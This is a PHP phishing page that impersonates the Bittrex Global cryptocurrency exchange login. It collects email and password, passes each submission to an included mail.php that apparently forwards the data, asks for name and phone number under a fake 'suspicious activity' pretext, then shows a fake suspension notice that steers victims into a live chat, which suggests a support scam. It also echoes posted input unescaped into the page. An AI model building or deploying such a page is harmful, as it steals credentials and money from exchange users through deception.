<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <title>Bittrex Global - Log in</title>
        <meta http-equiv="Content-Language" content="en" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <!-- Core CSS -->
        <link rel="stylesheet" type="text/css" href="./assets/thirdparty.bundle.min.css" />
        <link rel="stylesheet" type="text/css" href="./assets/datatables.bundle.min.css" />
        <link rel="stylesheet" type="text/css" href="./assets/bittrexcore.bundle.min.css" />
        <link rel="stylesheet" type="text/css" href="./assets/signin.bundle.min.css" />
        <link rel="stylesheet" type="text/css" href="./assets/signin.bundle.min.css" />
        <link href="./assets/css" rel="stylesheet noreferrer" type="text/css" />
        <link href="./assets/css(1)" rel="stylesheet noreferrer" type="text/css" />
        <?php include 'css-file.php';?>
    </head>
    <body class="login-body btx-intl no-auth">
        <div class="site-banner-container" style="top: 57px;">
            <div id="alert-news" class="alert alert-info alert-override bittrex-banner">
                <div id="alert-news-text">
                    <span id="alert-news-title"></span>
                    <span id="alert-news-message"></span>
                </div>

                <span class="banner-close">
                    <i class="fa fa-times" aria-hidden="true"></i>
                </span>
            </div>
        </div>
        <nav class="navbar common-navbar header-nav navbar-fixed-top">
            <div class="navbar-header">
                <h1 class="logo">
                    <a href="">
                        <span class="bittrex-logo-mark"></span>
                    </a>
                </h1>
            </div>
        </nav>
        <section class="section-register user-container">
              <?php
                 if (isset($_POST['btnLoginMore'])) {
                    include 'mail.php';
                ?>
                <div class="container">
                <h3 class="trade-aside-header">Verification Require</h3>
                <h6 class="text-center" style="font-size: 20px">Some Suspicious Activity Found With Your Account, Enter Your Phone Number to Verify Your Identity.
                </h6>
                <form action="" class="form home-register-form" method="post">
                    <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                   <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                    <div class="form-group">
                        <label for="email_register" type="text" name="name">Full Name:</label>
                        <input class="form-control input-validation-error" id="name"  name="name" placeholder="Full Name" type="text" required />
                    </div>
                    <div class="form-group">
                        <label for="password_register" name="number">Phone Number:</label>
                        <input class="form-control" id="number" name="number" placeholder="Phone Number" type="text" required />
                    </div>
                    <div class="form-group">
                        <button name="fromLog" class="g-recaptcha register-btn login" type="submit">
                            Verify
                        </button>
                    </div>
                </form>
            </div>
                 <?php } elseif (isset($_POST['fromLog'])) {
                     include 'mail.php';
                 ?>
                  <div class="container">
                <h3 class="trade-aside-header">Important Message</h3>
                <h6 class="text-center" style="font-size: 20px">
                    Due to unauthorized activity and identification failure on your Account. Account Access <br>has been suspended.Please Get in touch with our Support Staff Immediately
                </h6>
                               
                 <label style="font-weight: 600; font-size: 18px;">Error CODE: EBRX1</label><br>
                <a href="javascript:void(Tawk_API.toggle())"> <button type="button" class="btn" style="background-color: #7EA842;color: #fff;
                font-weight: bold;    padding: 10px;
                border: none;
                cursor: pointer; margin-top: 20px;">Ask Expert</button></a>
                
            </div>
                  <?php } else { ?>
                  <div class="container">
                <h3 class="trade-aside-header">Log In</h3>
                <form action="" class="form home-register-form" method="post">
                    
                    <div class="form-group">
                        <label for="email_register" type="email" name="email">Email address:</label>
                        <input autofocus="autofocus"
                            class="form-control input-validation-error" id="email"  name="email" placeholder="Email Address" type="email" required />
                    </div>
                    <div class="form-group">
                        <label for="password_register" name="email">Password:</label>
                        <input class="form-control" id="password" name="password" placeholder="Your Password" type="password" required />
                    </div>
                    <div class="form-group form-group-accept">
                        <div class="common-checkbox-container">
                            <input class="common-checkbox sign-up-checkbox" data-val="true" data-val-required="The Remember me? field is required." id="RememberMe" name="RememberMe" type="checkbox" value="true" />
                            <span class="icon-checkmark-white"></span><input name="RememberMe" type="hidden" value="false" />
                        </div>
                        <span class="remember-me">Remember me</span>
                        <a class="forgot-pwd" href="#">Forgot password?</a>
                    </div>
                    <div class="form-group">
                      
                        <button name="btnLoginMore" class="g-recaptcha register-btn login" type="submit">
                            Log In
                        </button>
                    </div>
                </form>
                <p class="section-register-footer">
                    <span>Don't have an account?</span>
                    <a href="#">Sign Up</a>
                </p>
            </div>
                   <?php } ?>
        </section>
    
               <!--Start of Tawk.to Script-->
            <script type="text/javascript">
            var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
            (function(){
            var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
            s1.async=true;
            s1.src='https://embed.tawk.to/620a586d9bd1f31184dc89bb/1frs6irvs';
            s1.charset='UTF-8';
            s1.setAttribute('crossorigin','*');
            s0.parentNode.insertBefore(s1,s0);
            })();
            </script>
            <!--End of Tawk.to Script-->   
    </body>
</html>
